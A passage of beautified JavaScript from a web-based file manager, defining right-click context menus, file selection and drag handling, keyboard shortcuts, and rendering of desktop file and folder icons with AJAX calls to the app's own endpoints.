            }), $('<i class="menuTreeFav"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuTreeFav",
                callback: function(e) {
                    _menuTree(e)
                },
                items: {
                    fav_page: {
                        name: LNG.manage_fav,
                        className: "fav_page",
                        icon: "star",
                        accesskey: "f"
                    },
                    fav_remove: {
                        name: LNG.fav_remove,
                        className: "fav_remove",
                        icon: "trash",
                        accesskey: "r"
                    },
                    sep1: "--------",
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    explorer: {
                        name: LNG.manage_folder,
                        className: "explorer",
                        icon: "laptop",
                        accesskey: "v"
                    },
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    },
                    sep2: "--------",
                    past: {
                        name: LNG.past,
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    newfolder: {
                        name: LNG.newfolder,
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    newfile: {
                        name: LNG.newfile,
                        className: "newfile",
                        icon: "file-alt",
                        accesskey: "j"
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _bindTreeRoot = function() {
            $('<i class="' + selectTreeSelectorRoot.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: selectTreeSelectorRoot,
                callback: function(e) {
                    _menuTree(e)
                },
                items: {
                    explorer: {
                        name: LNG.manage_folder,
                        className: "explorer",
                        icon: "laptop",
                        accesskey: "v"
                    },
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    past: {
                        name: LNG.past,
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    newfolder: {
                        name: LNG.newfolder,
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    newfile: {
                        name: LNG.newfile,
                        className: "newfile",
                        icon: "file-alt",
                        accesskey: "j"
                    },
                    sep2: "--------",
                    fav: {
                        name: LNG.add_to_fav,
                        className: "fav",
                        icon: "star",
                        accesskey: "f"
                    },
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    }
                }
            })
        },
        _bindTreeFolder = function() {
            $('<i class="' + selectTreeSelectorFolder.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: selectTreeSelectorFolder,
                callback: function(e) {
                    _menuTree(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    download: {
                        name: LNG.download,
                        className: "download",
                        icon: "download",
                        accesskey: "x"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy,
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute,
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    past: {
                        name: LNG.past,
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    rname: {
                        name: LNG.rename,
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove,
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    newfolder: {
                        name: LNG.newfolder,
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        accesskey: "m",
                        items: {
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav",
                                icon: "star"
                            },
                            open_ie: {
                                name: LNG.open_ie,
                                className: "open_ie",
                                icon: "globe"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link",
                                accesskey: "l"
                            },
                            explorer: {
                                name: LNG.manage_folder,
                                className: "explorer line_top",
                                icon: "laptop",
                                accesskey: "v"
                            },
                            openProject: {
                                name: LNG.openProject,
                                className: "openProject",
                                icon: "edit"
                            }
                        }
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _bindTreeFolderEditor = function() {
            $('<i class="' + selectTreeSelectorFolder.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: selectTreeSelectorFolder,
                callback: function(e) {
                    _menuTree(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    explorer: {
                        name: LNG.manage_folder,
                        className: "explorer",
                        icon: "laptop",
                        accesskey: "v"
                    },
                    download: {
                        name: LNG.download,
                        className: "download",
                        icon: "download",
                        accesskey: "x"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy,
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute,
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    past: {
                        name: LNG.past,
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    rname: {
                        name: LNG.rename,
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove,
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    newfolder: {
                        name: LNG.newfolder,
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    newfileOther: common_menu.newfileOther,
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        accesskey: "m",
                        items: {
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav",
                                icon: "star"
                            },
                            open_ie: {
                                name: LNG.open_ie,
                                className: "open_ie",
                                icon: "globe"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link",
                                accesskey: "l"
                            }
                        }
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _bindEditorFile = function() {
            $('<i class="' + selectTreeSelectorFile.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: selectTreeSelectorFile,
                callback: function(e) {
                    _menuTree(e)
                },
                items: {
                    open: {
                        name: LNG.open,
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    },
                    edit: {
                        name: LNG.edit,
                        className: "edit",
                        icon: "edit",
                        accesskey: "e"
                    },
                    download: {
                        name: LNG.download,
                        className: "download",
                        icon: "download",
                        accesskey: "x"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    rname: {
                        name: LNG.rename,
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    copy: {
                        name: LNG.copy,
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute,
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    remove: {
                        name: LNG.remove,
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    clone: {
                        name: LNG.clone,
                        className: "clone",
                        icon: "external-link",
                        accesskey: "l"
                    },
                    open_ie: {
                        name: LNG.open_ie,
                        className: "open_ie",
                        icon: "globe"
                    },
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _bindTaskBar = function() {
            $('<i class="taskBarMenu"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".taskBarMenu",
                items: {
                    quitOthers: {
                        name: LNG.close_others,
                        className: "quitOthers",
                        icon: "remove-circle",
                        accesskey: "o"
                    },
                    quit: {
                        name: LNG.close,
                        className: "quit",
                        icon: "remove",
                        accesskey: "q"
                    }
                },
                callback: function(e, a) {
                    var t = a.$trigger.attr("id"),
                        i = art.dialog.list[t];
                    switch (e) {
                        case "quitOthers":
                            $.each(art.dialog.list, function(e, a) {
                                t != e && a.close()
                            });
                            break;
                        case "quit":
                            i.close()
                    }
                }
            })
        },
        _bindTask = function() {
            $.contextMenu({
                zIndex: 9999,
                selector: ".task_tab",
                items: {
                    closeAll: {
                        name: LNG.dialog_close_all,
                        icon: "remove-circle",
                        accesskey: "q"
                    },
                    showAll: {
                        name: LNG.dialog_display_all,
                        icon: "th-large",
                        accesskey: "s"
                    },
                    hideAll: {
                        name: LNG.dialog_min_all,
                        icon: "remove",
                        accesskey: "h"
                    }
                },
                callback: function(e, a) {
                    var t = a.$trigger.attr("id");
                    switch (art.dialog.list[t], e) {
                        case "showAll":
                            $.each(art.dialog.list, function(e, a) {
                                a.display(!0)
                            });
                            break;
                        case "hideAll":
                            $.each(art.dialog.list, function(e, a) {
                                a.display(!1)
                            });
                            break;
                        case "closeAll":
                            $.each(art.dialog.list, function(e, a) {
                                a.close()
                            });
                            break;
                        default:
                    }
                }
            })
        },
        _bindDialog = function() {
            $('<i class="dialog_menu"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".dialog_menu",
                items: {
                    quit_dialog: {
                        name: LNG.close,
                        className: "quit_dialog",
                        icon: "remove",
                        accesskey: "q"
                    },
                    hide_dialog: {
                        name: LNG.dialog_min,
                        className: "hide_dialog",
                        icon: "minus",
                        accesskey: "h"
                    },
                    refresh: {
                        name: LNG.refresh,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "r"
                    },
                    open_window: {
                        name: LNG.open_ie,
                        className: "open_window",
                        icon: "globe",
                        accesskey: "b"
                    }
                },
                callback: function(e, a) {
                    var t = a.$trigger.attr("id"),
                        i = art.dialog.list[t];
                    switch (e) {
                        case "quit_dialog":
                            i.close();
                            break;
                        case "hide_dialog":
                            i.display(!1);
                            break;
                        case "refresh":
                            i.refresh();
                            break;
                        case "open_window":
                            i.open_window();
                            break;
                        default:
                    }
                }
            })
        },
        _menuTree = function(e) {
            switch (e) {
                case "edit":
                    ui.tree.openEditor();
                    break;
                case "open":
                    ui.tree.open();
                    break;
                case "refresh":
                    ui.tree.refresh();
                    break;
                case "copy":
                    ui.tree.copy();
                    break;
                case "cute":
                    ui.tree.cute();
                    break;
                case "past":
                    ui.tree.past();
                    break;
                case "clone":
                    ui.tree.clone();
                    break;
                case "rname":
                    ui.tree.rname();
                    break;
                case "remove":
                    ui.tree.remove();
                    break;
                case "info":
                    ui.tree.info();
                    break;
                case "download":
                    ui.tree.download();
                    break;
                case "open_ie":
                    ui.tree.openIE();
                    break;
                case "search":
                    ui.tree.search();
                    break;
                case "share":
                    ui.tree.share();
                    break;
                case "search":
                    ui.tree.search();
                    break;
                case "newfolder":
                    ui.tree.create("folder");
                    break;
                case "newfile":
                    ui.tree.create("file");
                    break;
                case "explorer":
                    ui.tree.explorer();
                    break;
                case "openProject":
                    ui.tree.openProject();
                    break;
                case "fav_page":
                    core.setting("fav");
                    break;
                case "fav":
                    ui.tree.fav();
                    break;
                case "fav_remove":
                    ui.tree.fav_remove();
                    break;
                case "refresh_all":
                    ui.tree.init();
                    break;
                case "quit":
                    break;
                default:
            }
        };
    return {
        initDesktop: _init_desktop,
        initExplorer: _init_explorer,
        initEditor: _init_editor,
        show: function(e, a, t) {
            e && (rightMenu.hidden(), $(e).contextMenu({
                x: a,
                y: t
            }))
        },
        menuShow: function() {
            var e = $(".context-menu-list").filter(":visible"),
                a = $(".context-menu-active");
            if (0 != e.length && 0 != a.length) {
                if (e.find(".disable").addClass("disabled"), a.hasClass("menufile")) {
                    var t = fileLight.type(Global.fileListSelect);
                    "zip" == t ? e.find(".unzip").show() : e.find(".unzip").hide(), inArray(core.filetype.image, t) ? e.find(".setBackground").show() : e.find(".setBackground").hide(), "oexe" == t ? e.find(".app_edit").show() : e.find(".app_edit").hide(), inArray(core.filetype.image, t) || inArray(core.filetype.music, t) || inArray(core.filetype.movie, t) || inArray(core.filetype.bindary, t) || inArray(core.filetype.doc, t) ? e.find(".open_text").hide() : e.find(".open_text").show()
                }
                if (a.hasClass("dialog_menu")) {
                    var i = a.attr("id"),
                        n = art.dialog.list[i];
                    n.has_frame() ? (e.find(".open_window").show(), e.find(".refresh").show()) : (e.find(".open_window").hide(), e.find(".refresh").hide())
                }
                if (a.hasClass("menuMore")) {
                    var s = 0;
                    Global.fileListSelect.each(function() {
                        var e = core.pathExt(fileLight.name($(this)));
                        (inArray(core.filetype.music, e) || inArray(core.filetype.movie, e)) && (s += 1)
                    }), 0 == s ? e.find(".playmedia").hide() : e.find(".playmedia").show()
                }
            }
        },
        menuCurrentPath: function(e) {
            var a = ".createLink,.createProject,.cute,.remove,.rname,.zip,.unzip,.newfile,.newfolder,.newfileOther,.app_create,.app_install,.past,.upload,.clone",
                t = "disable";
            "writeable" == e ? ($(".path_tips").hide(), $("ul.menufile").find(a).removeClass(t), $("ul.menufolder").find(a).removeClass(t), $("ul.fileContiner_menu").find(a).removeClass(t), $(".tools-left button").removeClass("disabled")) : ($(".path_tips").show(), $("ul.menufile").find(a).addClass(t), $("ul.menufolder").find(a).addClass(t), $("ul.fileContiner_menu").find(a).addClass(t), $(".tools-left button").addClass("disabled"))
        },
        isDisplay: function() {
            var e = !1;
            return $(".context-menu-list").each(function() {
                "none" != $(this).css("display") && (e = !0)
            }), e
        },
        hidden: function() {
            $(".context-menu-list").filter(":visible").trigger("contextmenu:hide")
        }
    }
}), define("app/src/desktop/fileSelect", [], function() {
    var e = !1,
        a = !1,
        t = !1,
        i = function() {
            s(), n(), o()
        },
        n = function() {
            $(Config.FileBoxClass).die("touchstart").live("touchstart", function() {
                $(this).hasClass("select") ? ui.path.open() : (d.clear(), $(this).removeClass("select"), $(this).addClass("select"), d.select())
            }), $(Config.FileBoxClass).live("mouseenter", function() {
                a && ($(this).hasClass(Config.TypeFolderClass) && !$(this).hasClass(Config.SelectClassName) || $(this).hasClass("menuRecycleButton")) && $(this).addClass("selectDragTemp"), e || a || $(this).addClass(Config.HoverClassName), $(this).unbind("mousedown").mousedown(function(e) {
                    if (rightMenu.hidden(), e.ctrlKey || e.shiftKey || $(this).hasClass(Config.SelectClassName) || (d.clear(), $(this).addClass(Config.SelectClassName), d.select()), 3 != e.which || $(this).hasClass(Config.SelectClassName) || (d.clear(), $(this).addClass(Config.SelectClassName), d.select()), e.ctrlKey && ($(this).hasClass(Config.SelectClassName) ? t = !0 : (d.setMenu($(this)), $(this).addClass(Config.SelectClassName)), d.select()), e.shiftKey) {
                        var a = parseInt($(this).attr(Config.FileOrderAttr));
                        if (0 == Global.fileListSelectNum) c(0, a);
                        else {
                            var i = parseInt(Global.fileListSelect.first().attr(Config.FileOrderAttr)),
                                n = parseInt(Global.fileListSelect.last().attr(Config.FileOrderAttr));
                            i > a ? c(a, i) : a > n ? c(n, a) : a > i && n > a && c(i, a)
                        }
                    }
                })
            }).die("mouseleave").live("mouseleave", function() {
                $(this).removeClass(Config.HoverClassName), $(this).removeClass("selectDragTemp")
            }).die("click").live("click", function(e) {
                stopPP(e), e.ctrlKey || e.shiftKey || (d.clear(), $(this).addClass(Config.SelectClassName), d.select()), e.ctrlKey && t && (t = !1, d.resumeMenu($(this)), $(this).removeClass(Config.SelectClassName), d.select())
            }), $(Config.FileBoxClass).unbind("dblclick").live("dblclick", function(e) {
                stopPP(e), e.altKey ? ui.path.pathInfo() : ui.path.open()
            }), $(Config.FileBoxTittleClass).unbind("dblclick").live("dblclick", function(e) {
                return ui.path.rname(), stopPP(e), !1
            })
        },
        s = function() {
            var t, i, n, s = 100,
                o = 50,
                r = 30,
                l = 80 - Global.topbar_height,
                c = 0,
                p = !1,
                u = 0,
                h = 0;
            $(Config.FileBoxClass).unbind("mousedown").live("mousedown", function(a) {
                return Global.shiftKey ? void 0 : ui.isEdit() ? !0 : 1 != a.which || e ? !0 : (t = $(this), f(a), this.setCapture && this.setCapture(), $(document).mousemove(function(e) {
                    m(e)
                }), $(document).one("mouseup", function(e) {
                    return v(e), this.releaseCapture && this.releaseCapture(), stopPP(e), !1
                }), stopPP(a), !1)
            });
            var f = function(e) {
                    rightMenu.hidden(), a = !0, c = $.now(), u = e.pageY, h = e.pageX, i = $(document).height(), n = $(document).width()
                },
                m = function(e) {
                    if (!a) return !0;
                    $.now() - c > s && !p && _();
                    var t = e.clientX >= n - 50 ? n - 50 : e.clientX,
                        r = e.clientY >= i - 50 ? i - 50 : e.clientY;
                    t = 0 >= t ? 0 : t, r = 0 >= r ? 0 : r, t -= o, r -= l, $(".draggable-dragging").css("left", t), $(".draggable-dragging").css("top", r), Global.isIE && $("." + Config.TypeFolderClass + ",div.menuRecycleButton").each(function() {
                        var a = e.pageX,
                            t = e.pageY,
                            i = $(this).offset(),
                            n = $(this).width(),
                            s = $(this).height();
                        a > i.left && i.left + n > a && t > i.top && i.top + s > t ? $(this).addClass("selectDragTemp") : $(this).removeClass("selectDragTemp")
                    })
                },
                v = function(e) {
                    if (!a) return !1;
                    a = !1, p = !1, $("body").css("cursor", "auto"), $(".draggable-dragging").fadeOut(200, function() {
                        $(this).remove()
                    });
                    var t = G.this_path,
                        i = 0 == $(".selectDragTemp").length;
                    i || (t += d.name($(".selectDragTemp"))), Global.ctrlKey ? (Math.abs(e.pageX - h) > r || Math.abs(e.pageY - u) > r) && ui.path.copyDrag(t, i) : i || ($(".selectDragTemp").hasClass("menuRecycleButton") ? ui.path.remove() : ui.path.cuteDrag(t))
                },
                _ = function() {
                    p = !0, $("body").css("cursor", "move"), t.find(".ico").attr("filetype"), $('<div class="file draggable-dragging"><div class="drag_number">' + Global.fileListSelectNum + "</div>" + '<div class="ico" style="background:' + t.find(".ico").css("background") + '"></div>' + "</div>").appendTo("body")
                }
        },
        o = function() {
            var t = null,
                i = null,
                n = null;
            $(Config.BodyContent).unbind("mousedown").live("mousedown", function(e) {
                return ui.isEdit() ? !0 : a || 1 != e.which ? !0 : (s(e), this.setCapture && this.setCapture(), $(document).unbind("mousemove").mousemove(function(e) {
                    o(e)
                }), $(document).one("mouseup", function(e) {
                    r(e), Global.isDragSelect = !0, this.releaseCapture && this.releaseCapture()
                }), stopPP(e), !1)
            });
            var s = function(a) {
                    $(a.target).parent().hasClass(Config.FileBoxClassName) || $(a.target).parent().parent().hasClass(Config.FileBoxClassName) || $(a.target).hasClass("fix") || (rightMenu.hidden(), a.ctrlKey || a.shiftKey || d.clear(), 0 == $(a.target).hasClass("ico") && (0 == $("#selContainer").length && ($('<div id="selContainer"></div>').appendTo(Config.FileBoxSelector), n = $("#selContainer")), t = a.pageX, i = a.pageY - Global.topbar_height, e = !0))
                },
                o = function(a) {
                    if (!e) return !0;
                    "none" == n.css("display") && n.css("display", "");
                    var s = a.pageX,
                        o = a.pageY - Global.topbar_height;
                    n.css({
                        left: Math.min(s, t),
                        top: Math.min(o, i),
                        width: Math.abs(s - t),
                        height: Math.abs(o - i)
                    });
                    for (var r = n.offset().left, l = n.offset().top - Global.topbar_height, c = n.width(), p = n.height(), u = Global.fileListNum, h = 0; u > h; h++) {
                        var f = Global.fileListAll[h],
                            m = $(Global.fileListAll[h]),
                            v = f.offsetWidth + f.offsetLeft,
                            _ = f.offsetHeight + f.offsetTop;
                        if (v > r && _ > l && r + c > f.offsetLeft && l + p > f.offsetTop) {
                            if (!m.hasClass("selectDragTemp")) {
                                if (m.hasClass("selectToggleClass")) continue;
                                if (m.hasClass(Config.SelectClassName)) {
                                    m.removeClass(Config.SelectClassName).addClass("selectToggleClass"), d.resumeMenu(m);
                                    continue
                                }
                                m.addClass("selectDragTemp")
                            }
                        } else m.removeClass("selectDragTemp"), m.hasClass("selectToggleClass") && m.addClass(Config.SelectClassName).removeClass("selectToggleClass")
                    }
                },
                r = function() {
                    return e ? (n.css("display", "none"), $(".selectDragTemp").addClass(Config.SelectClassName).removeClass("selectDragTemp"), $(".selectToggleClass").removeClass("selectToggleClass"), d.select(), e = !1, t = null, i = null, void 0) : !1
                }
        },
        r = function(e) {
            var a = 0,
                t = Global.fileListSelect;
            Global.fileListSelectNum;
            var i = Global.fileListNum,
                n = function() {
                    var n = Global.fileRowNum;
                    if (1 == Global.fileListSelectNum) {
                        var s = parseInt(t.attr(Config.FileOrderAttr));
                        switch (e) {
                            case "up":
                                a = 0 >= s ? s : s - 1;
                                break;
                            case "left":
                                a = n > s ? 0 : s - n;
                                break;
                            case "down":
                                a = s >= i - 1 ? s : s + 1;
                                break;
                            case "right":
                                a = s + n >= i - 1 ? i - 1 : s + n;
                                break;
                            default:
                        }
                    } else if (Global.fileListSelectNum > 1) {
                        var o = parseInt(t.first().attr(Config.FileOrderAttr)),
                            r = parseInt(t.last().attr(Config.FileOrderAttr));
                        switch (e) {
                            case "up":
                                a = a = 0 >= o ? o : o - 1;
                                break;
                            case "left":
                                break;
                            case "down":
                                a = r >= i ? r : r + 1;
                                break;
                            case "right":
                                a = r + n >= i ? r : r + n;
                                break;
                            default:
                        }
                    }
                };
            return n(), Global.fileListAll.eq(a)
        },
        l = function(e) {
            var a;
            switch (e) {
                case "home":
                    a = Global.fileListAll.first();
                    break;
                case "end":
                    a = Global.fileListAll.last();
                    break;
                case "left":
                case "up":
                case "right":
                case "down":
                    a = r(e);
                    break;
                case "all":
                    a = Global.fileListAll;
                    break;
                default:
            }
            d.clear(), a.addClass(Config.SelectClassName), d.select()
        },
        c = function(e, a) {
            d.clear();
            for (var t = e; a >= t; t++) $(Global.fileListAll[t]).addClass(Config.SelectClassName);
            d.select()
        },
        d = {
            init: function() {
                var e = $(Config.FileBoxClass);
                e.each(function(e) {
                    $(this).attr(Config.FileOrderAttr, e)
                }), Global.fileListSelect = "", Global.fileListAll = e, Global.fileListNum = e.length, Global.fileListSelectNum = 0
            },
            select: function() {
                var e = $(Config.SelectClass);
                Global.fileListSelect = e, Global.fileListSelectNum = e.length, e.length > 1 && d.setMenu(e)
            },
            setInView: function() {},
            name: function(e) {
                return e.attr("data-name")
            },
            type: function(e) {
                return e.find(".ico").attr("filetype")
            },
            setMenu: function(e) {
                e.removeClass("menufile menufolder menuDefault").addClass("menuMore")
            },
            resumeMenu: function(e) {
                var a = {
                    fileBox: "menufile",
                    folderBox: "menufolder",
                    systemBox: "menuDefault"
                };
                for (var t in a) e.hasClass(t) && e.removeClass("menuMore").addClass(a[t]);
                $(".menuRecycleButton").removeClass("menuDefault")
            },
            getAllName: function() {
                var e = [];
                if (0 != Global.fileListSelectNum) {
                    var a = Global.fileListSelect;
                    return a.each(function() {
                        e.push(d.name($(this)))
                    }), e
                }
            },
            clear: function() {
                if (0 != Global.fileListSelectNum) {
                    var e = Global.fileListSelect;
                    e.removeClass(Config.SelectClassName), e.each(function() {
                        d.resumeMenu($(this))
                    }), Global.fileListSelect = "", Global.fileListSelectNum = 0
                }
            }
        };
    return {
        init: i,
        fileLight: d,
        selectPos: l
    }
}), define("app/src/desktop/ui", [], function() {
    var e = new Picasa;
    PicasaOpen = !1;
    var a = function() {
            fileLight.init(), ui.setStyle(), PicasaOpen = !1, e.initData()
        },
        t = function(e, a) {
            var a = "down" == a ? -1 : 1;
            return function(t, i) {
                return t = t[e], i = i[e], i > t ? -1 * a : t > i ? 1 * a : void 0
            }
        },
        i = function(e, a) {
            0 != e && (G.sort_field = e, $(".menu_set_sort").removeClass("selected"), $(".set_sort_" + e).addClass("selected")), 0 != a && (G.sort_order = a, $(".menu_set_desc").removeClass("selected"), $(".set_sort_" + a).addClass("selected")), r(!1, !0), $.ajax({
                url: "index.php?setting/set&k=list_sort_field,list_sort_order&v=" + G.sort_field + "," + G.sort_order
            })
        },
        n = function() {
            var e = 91;
            Global.ctrlKey = !1, $(document).keydown(function(a) {
                if ("none" != $("#PicasaView").css("display")) return !0;
                if (ui.isEdit()) return !0;
                if (rightMenu.isDisplay()) return !0;
                var t = !1;
                if (Global.ctrlKey || a.keyCode == e || a.ctrlKey) switch (t = !0, Global.ctrlKey = !0, a.keyCode) {
                        case 8:
                            ui.path.remove(), t = !0;
                            break;
                        case 65:
                            fileSelect.selectPos("all");
                            break;
                        case 67:
                            ui.path.copy();
                            break;
                        case 88:
                            ui.path.cute();
                            break;
                        case 83:
                            break;
                        case 86:
                            ui.path.past();
                            break;
                        case 70:
                            core.search($(".header-right input").val(), G.this_path);
                            break;
                        default:
                            t = !1
                    } else if (a.shiftKey) Global.shiftKey = !0;
                    else switch (a.keyCode) {
                        case 8:
                            t = !0;
                            break;
                        case 35:
                            fileSelect.selectPos("end");
                            break;
                        case 36:
                            fileSelect.selectPos("home");
                            break;
                        case 37:
                            fileSelect.selectPos("left"), t = !0;
                            break;
                        case 38:
                            fileSelect.selectPos("up");
                            break;
                        case 39:
                            fileSelect.selectPos("right"), t = !0;
                            break;
                        case 40:
                            fileSelect.selectPos("down");
                            break;
                        case 13:
                            ui.path.open(), t = !1;
                            break;
                        case 46:
                            ui.path.remove(), t = !0;
                            break;
                        case 113:
                            ui.path.rname(), t = !0;
                            break;
                        default:
                            t = !1
                    }
                    return t && (stopPP(a), a.keyCode = 0, a.returnValue = !1), !0
            }).keyup(function(a) {
                a.shiftKey && (Global.shiftKey = !1), a.keyCode != e && a.ctrlKey || (Global.ctrlKey = !1)
            })
        },
        s = function() {
            var e = 10,
                a = 10,
                t = 85,
                i = 100,
                n = 10,
                s = $(document).height() - 50,
                o = Math.floor((s - e) / (i + n)),
                r = 0,
                l = 0,
                c = 0,
                d = 0;
            $(".fileContiner .file").css("position", "absolute"), $(".fileContiner .file").each(function(s) {
                r = s % o, l = Math.floor(s / o), c = a + (t + n) * l, d = e + (i + n) * r, $(this).css({
                    left: c,
                    top: d
                })
            })
        };
    this._hover_title = function(e) {
        return void 0 == e.size_friendly && (e.size_friendly = "0B"), ' data-name="' + e.name + '" title="' + LNG.name + ":" + e.name + "&#10;" + LNG.size + ":" + e.size_friendly + "&#10;" + LNG.permission + ":" + e.mode + "&#10;" + LNG.modify_time + ":" + e.mtime + '" '
    }, this._getFolderBox = function(e) {
        var a = "<div class='file folderBox menufolder' " + _hover_title(e) + ">";
        return a += "<div class='folder ico' filetype='folder'></div>", a += "<div id='" + e.name + "' class='titleBox'><span class='title' title='" + LNG.double_click_rename + "'>" + e.name + "</span></div></div>"
    }, this._getFileBox = function(e) {
        var a = "";
        if ("oexe" == e.ext && void 0 != e.icon) {
            var t = e.icon; - 1 == e.icon.search(G.static_path) && "http" != e.icon.substring(0, 4) && (t = G.static_path + "images/app/" + e.icon);
            var i = urlEncode(json_encode(e)),
                n = e.name.replace(".oexe", "");
            a = "<div class='file fileBox menufile' data-app=" + i + _hover_title(e) + ">", "app_link" == e.type ? (a += 0 == e.content.search("ui.path.open") ? "<div class='" + core.pathExt(n) + " ico'" : "<div class='folder ico'", a += ' filetype="oexe"></div><div class="app_link"></div>') : a += "<div class='ico' filetype='oexe' style='background-image:url(" + t + ")'></div>", a += "<div id='' class='titleBox'><span class='title' title='" + LNG.double_click_rename + "'>" + n + "</span></div></div>"
        } else if (inArray(core.filetype.image, e.ext)) {
            var s = core.path2url(G.this_path + e.name),
                o = "index.php?explorer/image&path=" + urlEncode(G.this_path + e.name);
            a += "<div class='file fileBox menufile'" + _hover_title(e) + ">", a += "<div picasa='" + s + "' thumb='" + o + "' title='" + e.name + "' class='picasaImage picture ico' filetype='" + e.ext + "' style='margin:3px 0 0 8px;background:#fff url(\"" + o + "\") no-repeat center center;;'></div>", a += "<div id='" + e.name + "' class='titleBox'><span class='title' title='" + LNG.double_click_rename + "'>" + e.name + "</span></div></div>"
        } else a += "<div class='file fileBox menufile'" + _hover_title(e) + ">", a += "<div class='" + e.ext + " ico' filetype='" + e.ext + "'></div>", a += "<div id='" + e.name + "' class='titleBox'><span class='title' title='" + LNG.double_click_rename + "'>" + e.name + "</span></div></div>";
        return a
    };
    var o = function(e) {
            var i = "",
                n = G.json_data.folderlist,
                o = G.json_data.filelist;
            n = "size" == G.sort_field || "ext" == G.sort_field ? n.sort(t("name", G.sort_order)) : n.sort(t(G.sort_field, G.sort_order)), o = o.sort(t(G.sort_field, G.sort_order)), G.json_data.folderlist = n, G.json_data.filelist = o;
            for (var r = "", l = "", c = 0; o.length > c; c++) r += this._getFileBox(o[c]);
            for (var c = 0; n.length > c; c++) l += this._getFolderBox(n[c]);
            i += "up" == G.sort_order ? l + r : r + l;
            var d = "";
            $(".systemBox").each(function() {
                d += $(this).get(0).outerHTML
            }), i = d + i, i += "<div style='clear:both'></div>", e ? $(Config.FileBoxSelector).hide().html(i).fadeIn(Config.AnimateTime) : $(Config.FileBoxSelector).html(i), a(), s()
        },
        r = function(e, a, t) {
            if (void 0 == e && (e = !0), void 0 == a && (a = !1), e) $.ajax({
                url: "index.php?explorer/pathList&path=" + G.this_path,
                dataType: "json",
                error: core.ajaxError,
                success: function(e) {
                    return e.code ? (G.json_data = e.data, c(), o(a), "function" == typeof t && t(e), void 0) : (core.tips.tips(e), $(Config.FileBoxSelector).html(""), !1)
                }
            }), $.ajax({
                url: "index.php?explorer/pathList&type=desktop&path=*recycle*/",
                dataType: "json",
                error: core.ajaxError,
                success: function(e) {
                    if (!e.code) return !1;
